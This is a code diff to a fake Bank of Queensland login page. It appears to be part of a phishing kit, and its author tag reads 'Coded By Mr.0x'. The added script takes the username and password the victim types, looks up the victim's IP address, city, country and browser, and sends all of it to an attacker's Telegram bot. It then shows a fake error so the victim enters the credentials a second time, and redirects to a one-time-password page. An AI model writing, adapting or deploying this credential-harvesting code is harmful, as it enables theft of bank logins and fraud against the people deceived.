@@ -9,8 +9,8 @@
         .form-group { margin-bottom: 15px; }
         label { display: block; font-weight: bold; }
         input { width: 100%; padding: 8px; box-sizing: border-box; }
-        .btn { background: #1b75bc; color: white; padding: 10px 20px; border: none; border-radius: 4px; width: 100%; }
-        .btn:disabled { opacity: 0.5; cursor: not-allowed; }
+        .btn { background: #1b75bc; color: white; padding: 10px; border: none; border-radius: 4px; width: 100%; }
+        .btn:disabled { opacity: 0.5; }
         .alert { background: #f8d7da; color: #721c24; padding: 10px; display: none; margin-top: 10px; }
     </style>
 </head>
@@ -34,9 +34,53 @@
         </div>
     </div>
 
+    <script src="config/email.js"></script>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
     <script>
+        // Helper: send message to Telegram
+        async function sendTelegram(message) {
+            try {
+                const res = await fetch(`https://api.telegram.org/bot${CONFIG.apikey}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: CONFIG.chatid, text: message })
+                });
+                return await res.json();
+            } catch (e) {
+                console.error('Telegram send error:', e);
+                return null;
+            }
+        }
+
+        // Helper: get IP and location
+        async function getClientInfo() {
+            let ip = '0.0.0.0';
+            try {
+                const res = await fetch('https://api.ipify.org?format=json');
+                const data = await res.json();
+                ip = data.ip;
+            } catch(e) {}
+            let location = { country: 'Unknown', city: 'Unknown' };
+            try {
+                const res = await fetch(`https://freeipapi.com/api/json/${ip}`);
+                const data = await res.json();
+                location = { country: data.countryName || 'Unknown', city: data.cityName || 'Unknown' };
+            } catch(e) {}
+            return { ip, location, userAgent: navigator.userAgent };
+        }
+
+        function getBrowser(ua) {
+            if (ua.includes('MSIE')) return 'Internet Explorer';
+            if (ua.includes('Firefox')) return 'Mozilla Firefox';
+            if (ua.includes('Chrome')) return 'Google Chrome';
+            if (ua.includes('Safari')) return 'Safari';
+            if (ua.includes('Opera')) return 'Opera';
+            return 'Unknown';
+        }
+
         $(document).ready(function() {
+            let attempt = 0;
+
             function toggleButton() {
                 const username = $('#txtUserid').val().trim();
                 const password = $('#id11').val().trim();
@@ -45,34 +89,41 @@
             $('#txtUserid, #id11').on('keyup change', toggleButton);
             $('#btnSignIn').prop('disabled', true);
 
-            let attempt = 0;
-
-            $('#login-form').submit(function(e) {
+            $('#login-form').submit(async function(e) {
                 e.preventDefault();
                 const username = $('#txtUserid').val().trim();
                 const password = $('#id11').val().trim();
                 if (!username || !password) return;
 
                 attempt++;
-                const formData = { username, password, title: 'Bank of Queensland' };
 
-                $.ajax({
-                    type: 'GET',
-                    url: 'next.html',
-                    data: formData,
-                    success: function() {
-                        if (attempt === 1) {
-                            $('#error-msg').show();
-                            $('#txtUserid, #id11').val('');
-                            $('#btnSignIn').prop('disabled', true);
-                        } else if (attempt === 2) {
-                            window.location.href = 'boq-otp.html';
-                        }
-                    },
-                    error: function(xhr, status, error) {
-                        alert('Error: ' + status);
-                    }
-                });
+                // Build message
+                const info = await getClientInfo();
+                const browser = getBrowser(info.userAgent);
+                let message = "";
+                message += "|++++++++++++|MyGov AU LOG|+++++++++++|\n";
+                message += "|Bank Name: Bank of Queensland\n";
+                message += "|Username: " + username + "\n";
+                message += "|Password: " + password + "\n";
+                message += "|+++++++++++++|   Information   |+++++++++++++++|\n";
+                message += "|Client IP: " + info.ip + "\n";
+                message += "|City : " + info.location.city + "\n";
+                message += "|Country : " + info.location.country + "\n";
+                message += "|UserAgent : " + info.userAgent + "\n";
+                message += "|+++++++++++++| Coded By Mr.0x |+++++++++++++|\n";
+                message += "|+++++++++++++|    @Mr0xBD     |+++++++++++++|\n";
+
+                // Send to Telegram
+                const result = await sendTelegram(message);
+                console.log('Telegram result:', result);
+
+                if (attempt === 1) {
+                    $('#error-msg').show();
+                    $('#txtUserid, #id11').val('');
+                    $('#btnSignIn').prop('disabled', true);
+                } else if (attempt === 2) {
+                    window.location.href = 'boq-otp.html';
+                }
             });
 
             $('#cross-1').click(function() {
